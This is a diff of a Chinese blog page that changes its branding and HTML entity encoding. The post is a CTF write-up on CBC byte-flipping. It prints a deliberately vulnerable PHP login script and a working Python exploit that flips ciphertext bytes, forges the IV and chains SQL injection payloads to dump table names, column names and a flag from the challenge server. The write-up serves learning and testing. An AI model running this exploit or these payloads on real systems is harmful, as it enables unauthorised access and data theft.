@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CBC字节翻转攻击 · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CBC字节翻转攻击 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.png"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
   "use strict";
   // rel=preload support test
   if( !w.loadCSS ){
@@ -95,9 +95,9 @@
   else {
     w.loadCSS = loadCSS;
   }
-}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.png"></div><!--.profile-saying
   i.fa.fa-comment
-  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CBC字节翻转攻击</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2018-05-27</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h1><h3 id="什么是CBC"><a href="#什么是CBC" class="headerlink" title="什么是CBC"></a>什么是CBC</h3><p>相信学过密码学的都知道，cbc属于分组加密中的其中一种模式<br>加密过程如下：<br><img src="https://i.imgur.com/7ZgndUF.png" alt=""></p>
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CBC字节翻转攻击</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2018-05-27</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h1><h3 id="什么是CBC"><a href="#什么是CBC" class="headerlink" title="什么是CBC"></a>什么是CBC</h3><p>相信学过密码学的都知道，cbc属于分组加密中的其中一种模式<br>加密过程如下：<br><img src="https://i.imgur.com/7ZgndUF.png" alt=""></p>
 <blockquote>
 <p><strong>Plaintext</strong>：待加密的数据。</p>
 <p><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p>
@@ -116,10 +116,10 @@
 <p><img src="https://i.imgur.com/YNx3n38.jpg" alt=""></p>
 <h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><p><a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-7828.html</a><br><a href="http://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/163756.html</a></p>
 <h3 id="一道ctf的题"><a href="#一道ctf的题" class="headerlink" title="一道ctf的题"></a>一道ctf的题</h3><p>这是实验吧的一道<a href="http://www.shiyanbar.com/ctf/2037" target="_blank" rel="noopener">简单的登陆题</a>，通过查看<strong>test.php</strong>,可以知道如下源代码：</p>
-<pre><code>define(&quot;SECRET_KEY&quot;, &#39;***********&#39;);
+<pre><code>define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);
 define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);
 error_reporting(0);
-include(&#39;conn.php&#39;);
+include(&apos;conn.php&apos;);
 function sqliCheck($str){
     if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str)){
         return 1;
@@ -127,7 +127,7 @@ function sqliCheck($str){
     return 0;
 }
 function get_random_iv(){
-$random_iv=&#39;&#39;;
+$random_iv=&apos;&apos;;
 for($i=0;$i&lt;16;$i++){
 $random_iv.=chr(rand(1,255));
 }
@@ -142,37 +142,37 @@ setcookie(&quot;cipher&quot;, base64_encode($cipher));
 }
 function show_homepage(){
     global $link;
-if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){
-$cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);
+if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){
+$cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);
 $iv = base64_decode($_COOKIE[&quot;iv&quot;]);
 if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
-$info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);
-$sql=&quot;select * from users limit &quot;.$info[&#39;id&#39;].&quot;,0&quot;;
+$info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);
+$sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;
 $result=mysqli_query($link,$sql);
 if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link))){
     $rows=mysqli_fetch_array($result);
-                echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&#39;.$rows[&#39;username&#39;].&#39;&lt;/center&gt;&lt;/h1&gt;&#39;;
+                echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;
             }
             else{
-                echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&#39;;
+                echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;
             }
 }else{
 die(&quot;ERROR!&quot;);
 }
 }
 }
-if(isset($_POST[&#39;id&#39;])){
-$id = (string)$_POST[&#39;id&#39;];
+if(isset($_POST[&apos;id&apos;])){
+$id = (string)$_POST[&apos;id&apos;];
 if(sqliCheck($id))
-        die(&quot;&lt;h1 style=&#39;color:red&#39;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);
-$info = array(&#39;id&#39;=&gt;$id);
+        die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);
+$info = array(&apos;id&apos;=&gt;$id);
 login($info);
-echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&#39;;
+echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;
 }else{
-if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&#39;cipher&#39;])){
+if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;])){
 show_homepage();
 }else{
-echo &#39;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;
+echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;
 &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;
 &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
 &lt;div class=&quot;header&quot;&gt;
@@ -180,14 +180,14 @@ echo &#39;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&
 &lt;span&gt;input id to login&lt;/span&gt;
 &lt;/div&gt;
 &lt;div class=&quot;content&quot;&gt;
-&lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&#39;\&#39;&quot; /&gt;
+&lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;
 &lt;/div&gt;
 &lt;div class=&quot;footer&quot;&gt;
 &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;
 &lt;/div&gt;
 &lt;/form&gt;
 &lt;/div&gt;
-&lt;/body&gt;&#39;;
+&lt;/body&gt;&apos;;
 }
 }
 </code></pre><p>对源码做分析：</p>
@@ -200,7 +200,7 @@ echo &#39;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&
 <p>给出Pcat的exp：</p>
 <pre><code># -*- coding:utf8 -*-
 # 请保留我的个人信息，谢谢~！
-__author__=&#39;pcat@chamd5.org&#39;
+__author__=&apos;pcat@chamd5.org&apos;
 
 from base64 import *
 import urllib
@@ -216,49 +216,49 @@ return urllib.quote(b64encode(value))
 def mycbc(value,idx,c1,c2):
 lst=list(value)
 lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))
-return &#39;&#39;.join(lst)
+return &apos;&apos;.join(lst)
 
 def pcat(payload,idx,c1,c2):
-url=r&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;
-myd={&#39;id&#39;:payload}
+url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;
+myd={&apos;id&apos;:payload}
 res=requests.post(url,data=myd)
-cookies=res.headers[&#39;Set-Cookie&#39;]
+cookies=res.headers[&apos;Set-Cookie&apos;]
 
-iv=re.findall(r&#39;iv=(.*?),&#39;,cookies)[0]
-cipher=re.findall(r&#39;cipher=(.*)&#39;,cookies)[0]
+iv=re.findall(r&apos;iv=(.*?),&apos;,cookies)[0]
+cipher=re.findall(r&apos;cipher=(.*)&apos;,cookies)[0]
 
 iv_raw=mydecode(iv)
 cipher_raw=mydecode(cipher)
 
 cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))
-cookies_new={&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new}
+cookies_new={&apos;iv&apos;:iv,&apos;cipher&apos;:cipher_new}
 cont=requests.get(url,cookies=cookies_new).content
-plain=b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])
+plain=b64decode(re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;,cont)[0])
 
-first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;
-iv_new=&#39;&#39;
+first=&apos;a:1:{s:2:&quot;id&quot;;s:&apos;
+iv_new=&apos;&apos;
 for i in range(16):
 iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))
 iv_new=myencode(iv_new)
 
-cookies_new={&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new}
+cookies_new={&apos;iv&apos;:iv_new,&apos;cipher&apos;:cipher_new}
 cont=requests.get(url,cookies=cookies_new).content
-print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)
+print &apos;Payload:%s\n&gt;&gt; &apos; %(payload)
 print cont
 pass
 
 
 def foo():
-pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)
-pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)
-pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)
-pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)
-pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)
+pcat(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)
+pcat(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)
+pcat(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)
+pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)
+pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)
 pass
 
-if __name__ == &#39;__main__&#39;:
+if __name__ == &apos;__main__&apos;:
 foo()
-print &#39;ok&#39;
+print &apos;ok&apos;
 </code></pre><p>最后还有一点就是给出openssl_encrypt的用法：</p>
 <pre><code>string openssl_encrypt ( string $data , string $method , string $key [, int $options = 0 [, string $iv = &quot;&quot; [, string &amp;$tag = NULL [, string $aad = &quot;&quot; [, int $tag_length = 16 ]]]]] )
 </code></pre><blockquote>
